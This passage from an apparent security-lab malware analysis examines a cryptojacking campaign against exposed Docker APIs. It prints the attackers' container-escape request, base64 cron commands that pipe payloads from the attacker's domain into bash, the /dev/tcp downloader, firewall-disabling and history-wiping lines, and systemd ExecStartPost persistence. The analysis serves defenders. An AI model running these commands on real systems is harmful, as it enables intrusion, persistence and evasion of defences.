    
  
</nav>

    </aside>

    <div class="col-span-12 desktop:col-span-8">
      <div class="authors grid grid-cols-2 tablet-lg:gap-x-[30px] gap-x-[14px] tablet-lg:gap-y-4 mobile:gap-y-3 gap-y-2">
        
          



<aside class="author-card flex flex-row w-full">
  
    


    



<figure>
    <img
        src="https://datadog-securitylabs.imgix.net/img/authors/matt_muir.jpg?auto=format&amp;w=48&amp;h=48&dpr=2&q=75"
        alt="Matt Muir"
        class="rounded-full w-12 h-12 max-w-max max-h-max"
        loading="eager"
    />
</figure>


  <div class="ml-2 tablet:ml-4">
    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20 font-extrabold ">Matt Muir</p>
    <p class="mt-1 text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20">Security Researcher - Linux Malware</p>
  </div>
</aside>

        
      </div>

      <span class="block pb-9 tablet:pb-12 desktop:pb-15"></span>

      

      <div class="article-content relative">
        <h2 id="key-points-and-observations" tabindex="-1"><a class="header-anchor" href="#key-points-and-observations">Key points and observations</a></h2>
<ul>
<li>We have identified a new cryptojacking campaign by the attackers behind <a href="https://www.cadosecurity.com/blog/spinning-yarn-a-new-linux-malware-campaign-targets-docker-apache-hadoop-redis-and-confluence">Spinning YARN</a></li>
<li>Like previous campaigns, the attackers target publicly exposed Docker Engine hosts for initial access.</li>
<li>We discovered two novel binary payloads, along with new attacker infrastructure used throughout the campaign. The new payloads include:
<ul>
<li><a href="#chkstart"><code>chkstart</code></a>â a remote access tool thatâs also capable of retrieving and dynamically executing payloads</li>
<li><a href="#lateral-movement"><code>exeremo</code></a>â a lateral movement tool, used to propagate the malware via SSH</li>
<li><a href="#vurl-binary"><code>vurl</code></a> (binary)â a Go port of the shell script downloader from the original campaign, used to retrieve malware from the attackerâs infrastructure</li>
</ul>
</li>
<li>The attackers also use an unusual <a href="#registering-persistence">persistence mechanism</a> by modifying existing systemd services and using the <code>ExecStartPost</code> configuration option to execute malicious commands.</li>
</ul>
<h2 id="attack-flow" tabindex="-1"><a class="header-anchor" href="#attack-flow">Attack Flow</a></h2>
<figure class="mt-4">
        <a href="https://datadog-securitylabs.imgix.net/img/attackers-deploying-new-tactics-in-campaign-targeting-exposed-docker-apis/spinning-yarn-2-attack-flow-diagram.png
?auto=format" target="SecurityLabsTab"><img
          class="w-full mx-auto" width="400" style="max-width: 400px;"
          srcset="https://datadog-securitylabs.imgix.net/img/attackers-deploying-new-tactics-in-campaign-targeting-exposed-docker-apis/spinning-yarn-2-attack-flow-diagram.png
?auto=format&w=400&dpr=1.75 1x, https://datadog-securitylabs.imgix.net/img/attackers-deploying-new-tactics-in-campaign-targeting-exposed-docker-apis/spinning-yarn-2-attack-flow-diagram.png
?auto=format&w=400&dpr=2&q=75 2x, https://datadog-securitylabs.imgix.net/img/attackers-deploying-new-tactics-in-campaign-targeting-exposed-docker-apis/spinning-yarn-2-attack-flow-diagram.png
?auto=format&w=400&dpr=3&q=55 3x" 
          src="https://datadog-securitylabs.imgix.net/img/attackers-deploying-new-tactics-in-campaign-targeting-exposed-docker-apis/spinning-yarn-2-attack-flow-diagram.png
?auto=format&w=400&dpr=1.75"
          alt="Attack flow diagram"
          loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">Attack flow diagram (click to enlarge)</figcaption></a> 
      </figure>
<h2 id="analysis-of-the-attack" tabindex="-1"><a class="header-anchor" href="#analysis-of-the-attack">Analysis of the attack</a></h2>
<p>Datadog Security Researchers recently encountered a new campaign that targets Docker API endpoints publicly exposed without authentication, with the objective of spreading cryptojacking malware. The observed tactics, techniques, and procedures (TTPs) bear resemblance to those seen in <a href="https://www.cadosecurity.com/blog/spinning-yarn-a-new-linux-malware-campaign-targets-docker-apache-hadoop-redis-and-confluence">Spinning YARN</a>, another campaign discovered in March 2024 by Cado Security. Based on analysis of the two campaigns and the infrastructure underpinning them, we have made a high-confidence assessment that these campaigns are linked.</p>
<p>Spinning YARN and similar campaigns are often difficult to differentiate based on telemetry alone. The attackers have a tendency to reuse names for payloads, even when the payloads themselves have been updated or completely replaced. This makes analysis of the individual payloads necessary to gain a comprehensive understanding of the campaignâs evolution.</p>
<h3 id="initial-access" tabindex="-1"><a class="header-anchor" href="#initial-access">Initial Access</a></h3>
<p>The campaign begins with the threat actor scanning the internet to identify hosts with port 2375 (Dockerâs default port) open. Once a valid host has been identified, exploitation begins with  some common Docker reconnaissance actions, namely querying the version of the Docker host before attempting to compromise it. The attackers achieve this by issuing the <code>docker version</code> command. This results in an <code>HTTP GET</code> request being sent to the <em>/v1.16/version</em> endpoint, and a subsequent response containing information about the server being returned to the attacker.</p>
<p>This procedure tells the attacker that the Docker host is available and is responding to commands from the open internet. After this confirmation, the attacker proceeds to the exploitation phase by attempting to spawn an <a href="https://hub.docker.com/_/alpine">Alpine Linux</a> container and utilizing the <code>Binds</code> parameter of the Dockerâs host configuration to bind the root directory of the Docker host itself into the container.</p>
<pre class="language-json"><code class="language-json"><span class="token property">"Image"</span><span class="token operator">:</span> <span class="token string">"alpine"</span><span class="token punctuation">,</span>
<span class="token property">"HostConfig"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
  <span class="token property">"Binds"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"/:/mnt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span></code></pre>
<p><em>Snippet of the command used to spawn an Alpine container and bind the hostâs root directory (/) to a mount point within the container (/mnt)</em></p>
<p>If this succeeds, the attacker escalates their privileges through accessing the underlying filesystem of the Docker host via the <em>/mnt</em> directory within the container.</p>
<p>Along with defining the container image and host configuration parameters, the attacker issues a shell command (seen below) within the container itself. This command uses the Linux <code>chroot</code> shell utility to set the root of subsequent processes to the <em>/mnt</em> directory (within which the underlying file system is mounted).</p>
<p>In the same command, a base64-encoded shell script is written out to <em>/usr/bin/vurl</em> and a cron job is saved to <em>/etc/crontab</em> and <em>/etc/cron.d/zzh</em>.  These jobs retrieve a second stage payload using the <code>vurl</code> executable (more on this <a href="#actions-on-objective">below</a>), and ensure itâs persistently executed.</p>
<pre><code>chroot /mnt/ /bin/sh -c echo dnVybCgpIHsKICAgIElGUz0vIHJlYWQgLXIgcHJvdG8geCBob3N0IHF1ZXJ5IDw8PCIkMSIKICAgIGV4ZWMgMzw+Ii9kZXYvdGNwLyR7aG9zdH0vJHtQT1JUOi04MH0iCiAgICBlY2hvIC1lbiAiR0VUIC8ke3F1ZXJ5fSBIVFRQLzEuMFxyXG5Ib3N0OiAke2hvc3R9XHJcblVzZXItQWdlbnQ6IHp6aGJvdFxyXG5cclxuIiA+JjMKICAgICh3aGlsZSByZWFkIC1yIGw7IGRvIGVjaG8gPiYyICIkbCI7IFtbICRsID09ICQnXHInIF1dICYmIGJyZWFrOyBkb25lICYmIGNhdCApIDwmMwogICAgZXhlYyAzPiYtCn0KCnZ1cmwgIiRAIgo= |base64 -d &gt;/usr/bin/vurl &amp;&amp; chmod +x /usr/bin/vurl;echo '* * * * * root echo dnVybCBodHRwOi8vYi45LTktMTEuY29tL2JyeXNqL2Iuc2gK|base64 -d|bash|bash' &gt;/etc/crontab &amp;&amp; echo '*/3 * * * * root echo dnVybCBodHRwOi8vYi45LTktMTEuY29tL2JyeXNqL2Iuc2gK|base64 -d|bash|bash' &gt;/etc/cron.d/zzh 
</code></pre>
<p><em>Malicious shell commands run in the Alpine container</em></p>
<h4 id="vurl-shell" tabindex="-1"><a class="header-anchor" href="#vurl-shell">vurl (shell) <a name="vurl-shell"></a></a></h4>
<p>To retrieve payloads throughout the campaign, the attacker deploys two downloader utilities, both of which are named <code>vurl</code> (likely inspired by <a href="https://curl.se/">curl</a>). This section will discuss the first <code>vurl</code> payload. The second will be discussed in a <a href="#vurl-binary">later</a> section.</p>
<p>The first <code>vurl</code> payload is similar to the one found in the original Spinning YARN campaign, with one minor difference: the inclusion of a hardcoded user agent string (<code>zzhbot</code>). The payload consists of a shell script to connect to an attacker-controlled command and control (C2) server, via the <em>/dev/tcp</em> device file, and execute a <code>HTTP GET</code> request to retrieve additional executables from the server.</p>
<p>If you attempt to retrieve a payload without specifying this user agent, the server will return a <code>HTTP 404</code> (file not found) error. Requiring the <code>zzhbot</code> user agent is likely an attempt by the attacker to limit payload retrieval to hosts compromised by the malware.</p>
<pre class="language-bash"><code class="language-bash"><span class="token function-name function">vurl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span>/ <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> proto x <span class="token function">host</span> query <span class="token operator">&lt;&lt;&lt;</span><span class="token string">"<span class="token variable">$1</span>"</span>
    <span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">3</span>&lt;></span><span class="token string">"/dev/tcp/<span class="token variable">${host}</span>/<span class="token variable">${PORT<span class="token operator">:-</span>80}</span>"</span>
    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-en</span> <span class="token string">"GET /<span class="token variable">${query}</span> HTTP/1.0<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Host: <span class="token variable">${host}</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>User-Agent: zzhbot<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;3</span>
    <span class="token punctuation">(</span>while <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> l<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;2</span> <span class="token string">"<span class="token variable">$l</span>"</span><span class="token punctuation">;</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$l</span> <span class="token operator">==</span> <span class="token string">$'<span class="token entity" title="\r">\r</span>'</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> <span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;3</span>
    <span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">3</span>>&amp;</span>-
<span class="token punctuation">}</span>

vurl <span class="token string">"<span class="token variable">$@</span>"</span></code></pre>
<p><em>Contents of vurl shell script payload</em></p>
<h3 id="actions-on-objective" tabindex="-1"><a class="header-anchor" href="#actions-on-objective">Actions on objective <a name="actions-on-objective"></a></a></h3>
<p>After the attacker gains initial access and achieves execution via cron, the next stage of the campaign is to fetch and execute a new shell scriptâ<code>b.sh</code>.</p>
<p>This script contains a base64-encoded tar archive of a new binary named <code>vurl</code>. The script decodes and extracts this binary to <em>/usr/bin/vurl</em>, overwriting the existing shell script version, before fetching and executing one of two shell scriptsâ<code>ar.sh</code> or <code>ai.sh</code>.</p>
<h4 id="vurl-binary" tabindex="-1"><a class="header-anchor" href="#vurl-binary">vurl (binary) <a name="vurl-binary"></a></a></h4>
<p>Consistent with binary payloads from the original campaign, this updated version of <code>vurl</code> is compiled from Go code and has much of the same functionality as its shell script equivalentâincluding the use of the <code>zzhbot</code> user agent string.</p>
<p>This binary differs from the shell script version in its use of hardcoded C2 domains. When the <code>vurl</code> binary is called, a URL is passed to the binary as an argument. The domain in this URL is then rewritten to one of two attacker-controlled C2 domains: <em>b.9-9-11[.]com</em> or, if the former is unavailable, <em>b.9-9-12[.]com</em>.</p>
<p>The <code>vurl</code> binary connects to the IP hosting the C2 domain via the <code>connect()</code> syscall and issues the same <code>GET</code> request used by the shell script. As before, the C2 server will only return a 200 status code and allow the download of a requested payload if the user agent is set to <code>zzhbot</code>.</p>
<pre class="language-c"><code class="language-c">v13 <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token string">"b.9-9-11.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13 <span class="token operator">||</span> <span class="token punctuation">(</span>v13 <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token string">"b.9-9-12.com"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0LL</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      s<span class="token punctuation">.</span>sa_family <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
      <span class="token function">bcopy</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>v13<span class="token operator">-></span>h_addr_list<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">.</span>sa_data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v13<span class="token operator">-></span>h_length<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>sa_data <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">0x50u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">connect</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x10u</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        v1 <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v10 <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v9 <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte_400E07<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: zzhbot\r\n\r\n"</span><span class="token punctuation">,</span> v9<span class="token punctuation">,</span> v13<span class="token operator">-></span>h_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v2 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">send</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
          <span class="token punctuation">{</span>
            v8 <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> haystack<span class="token punctuation">,</span> <span class="token number">0x400uLL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
              <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
              <span class="token function">fwrite</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> v8<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
              v7 <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">"\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token punctuation">)</span>
              <span class="token punctuation">{</span>
                v12 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token function">fwrite</span><span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">-</span> v7 <span class="token operator">+</span> v8<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">}</span>
          <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><em>Decompiler output demonstrating vurl binary functionality</em></p>
<p>With this updated <code>vurl</code> binary in place, the malware uses it to retrieve <code>ar.sh</code> if running under the root user, or <code>ai.sh</code> if running under a regular user. At the time of this writing, the <code>ai.sh</code> payload was no longer being served, making it likely that the attacker assumes the user will indeed be root.</p>
<pre class="language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token assign-left variable">vb</span><span class="token operator">=</span><span class="token string">'&lt;base64 string>'</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$vb</span><span class="token operator">|</span>base64 <span class="token parameter variable">-d</span> <span class="token operator">></span>/tmp/vb.tar <span class="token operator">&amp;&amp;</span><span class="token function">tar</span> <span class="token parameter variable">-xf</span> /tmp/vb.tar <span class="token parameter variable">-C</span> /usr/bin/ <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +x /usr/bin/vurl

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> <span class="token parameter variable">-u</span><span class="token variable">)</span></span>"</span> <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span> 
vurl  http://www.bing.com/brysj/d/ar.sh<span class="token operator">|</span><span class="token function">bash</span>
<span class="token keyword">else</span>
vurl http://www.google.com/brysj/d/ai.sh<span class="token operator">|</span><span class="token function">bash</span>
<span class="token keyword">fi</span></code></pre>
<p><em>Example contents of <code>b.sh</code></em></p>
<p>Note the usage of the <a href="http://bing.com">bing.com</a> and <a href="http://google.com">google.com</a> domains as attempts to obfuscate payload delivery domains. These are rewritten to the attacker's C2 by the <code>vurl</code> binary, as described <a href="#vurl-binary">above</a>.</p>
<p>Despite attempting to obfuscate payload delivery domains using this URL rewriting technique, the attacker revealed at least one of their domains during the initial access stage. The malicious cron job used to fetch <code>b.sh</code> includes a base64-encoded URL, which of course is trivial to decode.</p>
<p>At this point, the attacker uses the <code>ar.sh</code> payload to continue their actions on objective. This payload is similar to the previous version of Spinning YARN, and a summary of its functionality follows:</p>
<ul>
<li>Define a working directory of <em>/var/tmp/.222</em> (to store additional payloads)</li>
<li>Install various tools to perform code compilation and scan the internet</li>
<li>Remove existing cron entries</li>
<li>Weaken the system by disabling firewalls, clearing shell history, and preventing new lines from  being added to the history file</li>
<li>Compile the open source process hider <a href="https://github.com/gianlucaborello/libprocesshider">libprocesshider</a> on delivery and registering it with the dynamic linker. This behaviour was also observed in our recent blog <a href="https://securitylabs.datadoghq.com/articles/analysis-of-teamtnt-doppelganger/"><em>Analysis of a TeamTNT Doppelganger</em></a></li>
<li>Remove monitoring agents associated with cloud service providers such as Tencent and Alibaba Cloud</li>
<li>Clear various log files, including the syslog, messages, <em>auth.log</em>, <em>boot.log</em>, <em>dmesg</em>, etc</li>
<li>Retrieve and execute the next payload, <code>chkstart</code></li>
</ul>
<pre class="language-bash"><code class="language-bash">iptables <span class="token parameter variable">-F</span>
systemctl stop firewalld <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null
systemctl disable firewalld <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null
<span class="token function">service</span> iptables stop <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null
<span class="token builtin class-name">ulimit</span> <span class="token parameter variable">-n</span> <span class="token number">65535</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LC_ALL</span></span><span class="token operator">=</span>C 
<span class="token assign-left variable"><span class="token environment constant">HISTCONTROL</span></span><span class="token operator">=</span><span class="token string">"ignorespace<span class="token variable">${<span class="token environment constant">HISTCONTROL</span><span class="token operator">:+</span><span class="token operator">:</span>$HISTCONTROL}</span>"</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HISTFILE</span></span><span class="token operator">=</span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null
<span class="token builtin class-name">unset</span> <span class="token environment constant">HISTFILE</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null
<span class="token builtin class-name">shopt</span> <span class="token parameter variable">-ou</span> <span class="token function">history</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null
<span class="token builtin class-name">set</span> +o <span class="token function">history</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null
<span class="token assign-left variable"><span class="token environment constant">HISTSIZE</span></span><span class="token operator">=</span><span class="token number">0</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null</code></pre>
<p><em>Excerpt of <code>ar.sh</code> demonstrating firewall disabling rules and clearing shell history</em></p>
<h4 id="chkstart" tabindex="-1"><a class="header-anchor" href="#chkstart">chkstart <a name="ckstart"></a></a></h4>
<p>As mentioned above, <code>ar.sh</code> retrieves and executes a new binary, named <code>chkstart</code>. This is another Go binary, acting as a tool to configure the host for remote access, persistently execute the primary payload, and download additional payloads to continue the execution chain. <em>This binary is absent from public reporting on similar campaigns, suggesting that itâs a new tool the attacker is deploying.</em></p>
<pre class="language-c"><code class="language-c">urls<span class="token punctuation">.</span>array <span class="token operator">=</span> <span class="token string">"http://b.9-9-11.com/brysj/m/m.tar"</span><span class="token punctuation">;</span>
urls<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">33LL</span><span class="token punctuation">;</span>
urls<span class="token punctuation">.</span>cap <span class="token operator">=</span> <span class="token string">"http://b.9-9-12.com/brysj/m/m.tar"</span><span class="token punctuation">;</span>
v22 <span class="token operator">=</span> <span class="token number">33LL</span><span class="token punctuation">;</span>
v23 <span class="token operator">=</span> <span class="token string">"http://b.9-9-13.com/brysj/m/m.tar"</span><span class="token punctuation">;</span>
v24 <span class="token operator">=</span> <span class="token number">33LL</span><span class="token punctuation">;</span>
fallback_urls<span class="token punctuation">.</span>array <span class="token operator">=</span> <span class="token operator">&amp;</span>urls<span class="token punctuation">;</span>
fallback_urls<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">3LL</span><span class="token punctuation">;</span>
fallback_urls<span class="token punctuation">.</span>cap <span class="token operator">=</span> <span class="token number">3LL</span><span class="token punctuation">;</span>
user_agent<span class="token punctuation">.</span>str <span class="token operator">=</span> <span class="token string">"zzhbot"</span><span class="token punctuation">;</span>
user_agent<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">6LL</span><span class="token punctuation">;</span>
output_path<span class="token punctuation">.</span>str <span class="token operator">=</span> <span class="token string">"/var/tmp/.222"</span><span class="token punctuation">;</span>
output_path<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">13LL</span><span class="token punctuation">;</span>
v4 <span class="token operator">=</span> <span class="token function">main_downloadFile</span><span class="token punctuation">(</span>fallback_urls<span class="token punctuation">,</span> user_agent<span class="token punctuation">,</span> output_path<span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><em>chkstart main function - defining an array of payload delivery URLs before a call to <code>downloadFile</code></em></p>
<p>In the original Spinning YARN campaign, much of <code>chkstart</code>âs functionality was handled by shell scripts. Porting this functionality over to Go code could suggest the attacker is attempting to complicate the analysis process, since static analysis of compiled code is significantly more difficult than shell scripts. It could also be an attempt to take advantage of certain Go features, including cross-compilation, native tests, and strong typing.</p>
<p>Similar to the original Spinning YARN campaign, the developer neglected to strip the Go binaries after compilationâleaving <a href="https://dwarfstd.org/">DWARF</a> debug information intact. This makes static analysis easier, as this information can help a researcher understand the binaryâs purpose.</p>
<p><code>chkstart</code>âs main function begins with a check to determine whether a connection to one of the malicious domains below is currently active:</p>
<pre><code>m.9-9-8[.]com
m.9-9-11[.]com
m.9-9-12[.]com
m.9-9-13[.]com
m.9-9-14[.]com
m.9-9-15[.]com
m.9-9-16[.]com
m.9-9-17[.]com
m.9-9-18[.]com
m.9-9-19[.]com
</code></pre>
<p>The purpose of this check is to determine whether the host has already been compromised by the malware. If an established connection has already been made to one of the hardcoded <em>m</em> subdomains, <code>chkstart</code> will report this connection to stdout and exit the process.</p>
<p>If the host hasnât already been compromised, the malware proceeds to retrieve a tar archive of additional payloads to use for the next stage. It will then define a new array of URLs (depicted in the following bulleted list) and a user agent string of <code>zzhbot</code> and call another helper function named <code>downloadFile</code>.</p>
<p>This <code>downloadFile</code> function is used to download the previously-mentioned tar archive, <em>m.tar</em>â containing additional payloadsâfrom the new array of hardcoded URLs. Examples of these URLs can be seen below:</p>
<ul>
<li>http[://]b.9-9-11[.]com/brysj/m/m.tar</li>
<li>http[://]b.9-9-12[.]com/brysj/m/m.tar</li>
<li>http[://]b.9-9-13[.]com/brysj/m/m.tar</li>
</ul>
<p>If <em>m.tar</em> is available at one of these URLs, the archive is saved to a hardcoded path of <em>/var/tmp/.222</em>, the contents are extracted (more on this later), and the <em>/var/tmp/.222</em> directory is made executable.</p>
<h3 id="registering-persistence" tabindex="-1"><a class="header-anchor" href="#registering-persistence">Registering persistence <a name="registering-persistence"></a></a></h3>
<p>After retrieving the archive of additional payloads, the <code>chkstart</code> binary proceeds to register persistence for a new binary named <code>top</code>.</p>
<p>First, <code>chkstart</code> will list systemd unit files by issuing the command <code>systemctl --type=service list-unit-files</code>. The output of this command is then filtered to look for results with the string <code>enabled</code>, indicating that the service defined by the unit file is currently loaded and running.</p>
<pre class="language-bash"><code class="language-bash">atd.service                            enabled         enabled
auditd.service                         enabled         enabled
auth-rpcgss-module.service             static          -
autovt@.service                        <span class="token builtin class-name">alias</span>           -
cfn-hup.service                        disabled        disabled
chrony-config.service                  enabled         enabled</code></pre>
<p><em>Example output of systemctl --type=service list-unit-files</em></p>
<p>Of the resulting unit files, the malware locates the path to the file itself via the output of <code>systemctl show -p FragmentPath &lt;name of service&gt;</code>.</p>
<p>The next stage is to use these file paths to search the contents of the unit files with <code>grep</code> and determine whether the directive <code>ExecStart=</code> is present. Systemd uses this directive to define a custom command to execute once the service is loaded. An example value would be a path to the binary you would like to run as a service.</p>
<p>For unit files with the <code>ExecStart=</code> directive, systemd also allows you to define an additional command to be executed after the <code>ExecStart=</code> command completes. This is specified with the <code>ExecStartPost=</code> directive. The malware abuses this feature by inserting the line <code>ExecStartPost=/var/tmp/.222/top</code> into the unit file, resulting in the binary <code>top</code> being executed each time the service is loaded.</p>
<p>On a vanilla Amazon Linux EC2 instance, the malware identified <em>/usr/lib/systemd/system/amazon-ssm-agent.service</em> and <em>/usr/lib/systemd/system/atd.service</em> as candidates to target for this modification.</p>
